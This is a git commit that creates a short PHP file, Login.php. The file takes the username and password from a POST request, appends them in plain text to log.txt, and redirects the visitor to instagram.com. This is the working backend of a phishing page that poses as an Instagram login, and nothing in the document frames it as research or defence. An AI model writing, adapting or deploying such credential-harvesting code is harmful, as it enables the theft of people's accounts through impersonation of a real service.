995dffd26b5b6e74cfee3c7a62a9d5081c3f1fca
jackzz42 <growwithme2624@gmail.com>
2025-04-24 15:39:04 +0530

    Create Login.php

---
+++ Login.php
@@ -0,0 +1,13 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    $file = fopen("log.txt", "a");
+    fwrite($file, "Username: $username | Password: $password\n");
+    fclose($file);
+
+    header("Location: https://www.instagram.com");
+    exit();
+}
+?>
